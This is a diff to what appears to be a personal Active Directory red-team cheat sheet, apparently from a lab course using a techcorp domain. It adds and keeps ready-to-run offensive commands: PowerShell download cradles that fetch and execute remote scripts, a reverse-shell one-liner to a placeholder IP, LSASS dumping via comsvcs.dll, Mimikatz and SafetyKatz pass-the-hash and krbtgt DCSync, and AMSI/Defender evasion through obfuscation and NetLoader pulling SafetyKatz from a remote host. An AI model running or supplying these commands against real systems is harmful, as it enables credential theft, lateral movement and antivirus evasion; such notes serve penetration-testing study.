@@ -505,6 +505,11 @@ or
 
 PS> powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://<ip_addr>/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress <ip_Addr> -Port 443
 
+<b>::: download a file locally</b>
+
+PS> iex (iwr http://<localIP>/path/to/file -UseBasicParsing)
+PS> iex ((New-Object Net.webClient).DownloadString('http://<ip_addr>/path/to/file'))
+
 <b>-BLOODHOUND-</b>
 
 <a href="https://github.com/BloodHoundAD/BloodHound">bloodhound tool</a> 
@@ -526,7 +531,7 @@ powershell remoting
 
 ONE-TO-ONE | ONE-TO-MANY
 
-<b>::: store a session in a variable</b>
+<b>::: store a session or new session in a variable</b>
 
 PS> $[variable_name] = New-PSSession -ComputerName [hostname]
 PS> $b0ydC = New-PSSession -ComputerName ofsv-001
@@ -554,6 +559,7 @@ PS> Invoke-Command
 <b>::: use to execute commands or scriptblock</b>
 
 PS> Invoke-Command –Scriptblock{Get-Process} -ComputerName(Get-Content <list_of_servers>)
+PS> Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName (cat C:\path\to\file\with\hosts\.txt file)
 
 <b>::: use to execute script from file</b>
 
@@ -594,7 +600,9 @@ PS> pypykatz.exe live lsa
 PS> tasklist /FI "IMAGENAME eq lsass.exe"
 PS> rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
 
-<b>-LATERAL MOVEMENT : MIMIKATZ | OVER PASS THE HASH-</b>
+<b>-LATERAL MOVEMENT: MIMIKATZ | OVER PASS THE HASH-</b>
+
+pass the hash = NTLM || over pass the hash = kerberos
 
 <b>::: over pass the hash generate tokens from hashes or keys. | need elevation, run as admin </b>
 
@@ -604,7 +612,7 @@ PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.tech
 
 - safetyKatz
 
-PS> SafetyKatz.exe"sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe""exit"
+PS> SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
 
 <b>::: rubeus.exe Usage</b>
 
@@ -628,16 +636,38 @@ PS> SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 <b>-Offensive .NET - Tradecraft | AV bypass</b>
 
 like AMSI Trigger, exist Defender Check for Windows Defender.
+here is the same as previously with AMSI when is needed to obfuscate the code to bypass signature detections.
+minimal changes on strings matched with help.
 
 <a href="https://github.com/matterpreter/DefenderCheck">Defender Check</a> 
 
-<b> </b>
+<b>-Offensive .NET - Tradecraft | String Manipulation</b>
 
-<b> </b>
+- minimal changes to the code with help to bypass this
+- remember to check the code against any tool like AMSI Trigger, Defender Check, etc.
+- download latest version of Mimikatz and Out-CompressedDll.ps1
 
-<b> </b>
+--> Run the Out-CompressedDll.ps1 PowerShell script on Mimikatz binary and save the output to a file.
 
-<b> </b>
+PS> Out-CompressedDll </path/to/mimikatz.exe> > outputfilename.txt 
+
+<b>-Offensive .NET - Tradecraft | AV bypass - Obfuscation</b>
+
+<b>::: obfuscate complete binary </b>
+
+<a href="https://github.com/mkaring/ConfuserEx">Confuser Ex</a> 
+
+<b>-Offensive .NET - Tradecraft | Payload Delivery</b>
+
+<a href="https://github.com/Flangvik/NetLoader">NetLoader</a> 
+
+It can be used to load binary from file path or URL and patch AMSI & ETW while executing. 
+
+PS> C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe 
+
+We also have AssemblyLoad.exe that can be used to load the Netloader in-memory from a URL which then loads a binary from a file path or URL. 
+
+PS> C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe
 
 <b> </b>
 
